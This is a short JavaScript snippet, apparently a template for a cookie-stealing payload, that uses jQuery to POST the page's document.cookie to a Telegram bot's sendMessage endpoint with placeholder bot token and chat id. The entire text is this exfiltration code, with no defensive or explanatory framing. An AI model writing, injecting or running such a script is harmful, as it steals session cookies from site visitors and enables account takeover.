var settings = {
  "async": true,
  "crossDomain": true,
  "url": "https://api.telegram.org/botss/sendMessage",
  "method": "POST",
  "headers": {
    "Content-Type": "application/json",
    "cache-control": "no-cache"
  },
  "data": JSON.stringify({
    "chat_id": 0,
    "text": document.cookie
  })
}

$.ajax(settings).done(function (response) {
  console.log(response);
}); 
